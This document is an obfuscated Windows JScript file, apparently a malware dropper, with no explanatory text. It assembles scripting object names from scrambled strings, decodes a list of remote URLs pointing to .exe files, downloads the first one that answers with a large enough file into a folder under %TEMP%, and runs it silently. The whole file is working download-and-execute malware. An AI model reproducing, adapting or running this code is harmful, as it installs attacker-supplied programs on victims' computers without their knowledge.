

function nSVbQyVuQ(NpVlYOvWxjp) {
var ahiLVcSw = WScript.CreateObject("Wscript.Shell");
ahiLVcSw.Run(NpVlYOvWxjp, 0x1, 0x0);
}
function yoOMNSLlt(xwIJD,CHbiv,FRlQE) {
var cFUyP = "NnCVQF Nrb pt.Shell xckLXYd Scri".split(" ");
var NMw=((1)?"W" + cFUyP[4]:"")+cFUyP[2];
var gA = WScript.CreateObject(NMw);
var Aw = "%TEMP%\\";
return gA.ExpandEnvironmentStrings(Aw);
}
function XEYYgPgA() {
var lWROTOn = "ipting";
var oRKYZddLja = "ile";
var VOIrt = "System";
return "Sc" + "r" + lWROTOn + ".F" + oRKYZddLja + VOIrt + "Obj" + "ect";
}
function Tykd(KvhaZ) {
return WScript.CreateObject(KvhaZ);
}
function GpUG(kFbtO,jJYEg) {
kFbtO.write(jJYEg);
}
function qWZn(qtwsE) {
qtwsE.open();
}
function opHR(PPnTD,udCWQ) {
PPnTD.saveToFile(udCWQ,259-257);
}
function aKmb(UYCwg,FlPok,eELzW) {
UYCwg.open(eELzW,FlPok,false);
}
function RDgy(dUEGZ) {
if (dUEGZ == 824-624){return true;} else {return false;}
}
function HeQf(gSKEy) {
if (gSKEy > 183557-854){return true;} else {return false;}
}
function lyxZ(ouTQw) {
var bgQDl="";
for(j=(210-210); j < ouTQw.length; j++)
if (j % (523-521) != (234-234)) {
bgQDl += ouTQw.substr(j, 915-914);
}
return bgQDl;
}
function acFP(GESAW) {
GESAW.send();
}
function YgPd(xcSZA) {
return xcSZA.status;
}
var hT="StQhDiisBirsxidtKsXq7q8.xcjoimJ/26M9E.WeSxMeZ?D doRh7iYyxoXuAnUgUbKuryifBfz.rcIoQmQ/j609o.WeSxUev?I 1?L L?f E?";
var T = lyxZ(hT).split(" ");
var MSW = yoOMNSLlt("CzNr","hFous","XWApyy");
var JTb = new ActiveXObject(XEYYgPgA());
var xlgg = MSW+"egBMpdN\\";
try{
JTb.CreateFolder(xlgg);
}catch(QBUrOB){
};
var qVH = "2.XMLH";
var nov = (qVH + "TTP" + " FSOVsgh VonhD XML ream St afuOfBbU AD ZAdZlGC OD").split(" ");
var IS = true  , PCZC = nov[7] + "" + nov[9];
var GH = Tykd("MS"+nov[3]+(148609, nov[0]));
var ZFD = Tykd(PCZC + "B." + nov[5]+(385948, nov[4]));
var pBQ = 0;
var t = 1;
var zCMRNqy = 642159;
var s=pBQ;
while (true)  {
if(s>=T.length) {break;}
var CR = 0;
var OzV = ("ht" + " BzRYlwC tp rLvlD fpkZUJgi :// jqPHbtC .exe  GET").split(" ");
try  {
aKmb(GH,OzV[0]+OzV[2]+OzV[5]+T[s]+t, "GET"); acFP(GH); if (RDgy(YgPd(GH)))  {      
qWZn(ZFD); ZFD.type = 1; GpUG(ZFD,GH.responseBody); if (HeQf(ZFD.size))  {
CR = 1; ZFD.position = 0; opHR(ZFD,/*aWEU84XPjf*/xlgg/*cU0O69q7Uo*/+zCMRNqy+OzV[7]); try  {
if (((new Date())>0,7675216888)) {
nSVbQyVuQ(xlgg+zCMRNqy+/*hjB374xT7c*/OzV[7]/*IY7S57bKWr*/); 
break;
}
}
catch (Nv)  {
}; 
}; ZFD.close(); 
}; 
if (CR == 1)  {
pBQ = s; break; 
}; 
}
catch (Nv)  { 
}; 
s++;
}; 

